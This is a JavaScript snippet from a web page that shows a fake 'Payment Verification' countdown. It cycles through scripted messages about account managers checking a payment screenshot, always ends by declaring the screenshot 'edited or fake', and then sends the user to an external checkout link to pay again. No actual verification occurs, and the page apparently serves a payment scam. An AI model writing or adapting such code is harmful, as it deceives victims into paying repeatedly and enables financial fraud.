  <script>
        let timeLeft = 121; // total time (seconds)
        const total = timeLeft;
        const messageElement = document.getElementById('message');
        const contentElement = document.getElementById('content');
        const statusMessage = document.getElementById('statusMessage');

        const timerInterval = setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            const elapsed = ((total - timeLeft) / total) * 100;

            // Update timer display
            messageElement.innerHTML = `Payment Verification<br><center>${minutes}:${seconds < 10 ? '0' : ''}${seconds}</center>`;

            // Determine message based on percentage of time passed
            let message = '';
            if (elapsed >= 0 && elapsed <= 5) {
                message = 'Connecting to Account Department';
            } else if (elapsed > 5 && elapsed <= 10) {
                message = 'We Got Payment Screenshot & We shared it to account managers';
            } else if (elapsed > 10 && elapsed <= 40) {
                message = 'Account manager checking your screenshot';
            } else if (elapsed > 40 && elapsed <= 60) {
                message = 'Something is wrong in your screenshot';
            } else if (elapsed > 60 && elapsed <= 65) {
                message = 'Cross-checking your screenshot';
            } else if (elapsed > 65 && elapsed <= 98) {
                message = 'Another account manager checking your screenshot';
            } else if (elapsed > 98 && elapsed < 100) {
                message = 'We are sorry, this screenshot is completely edited or fake';
            }

            if (message) {
                statusMessage.textContent = message;
                statusMessage.classList.add('visible');
            }

            if (timeLeft <= 0) {
                clearInterval(timerInterval);

                // Clear status message
                statusMessage.textContent = '';
                statusMessage.classList.remove('visible');

                // Show failure and button
                contentElement.innerHTML = `
                    <img src="/rs/info.svg" alt="Failure Image" style="width: 80px; height: 80px;">
                    <h1>Sorry Payment<br>unsuccessful</h1>
                    <a href="https://himanpayment2checkout.pages.dev/OrderID=9192Method=BD2">
                        <button class="btn btn-full btn-l rounded-s font-600 gradient-red" style="margin-top: 20px;">
                            Try Again!
                        </button>
                    </a>
                `;
            }
        }, 1000);
    </script>
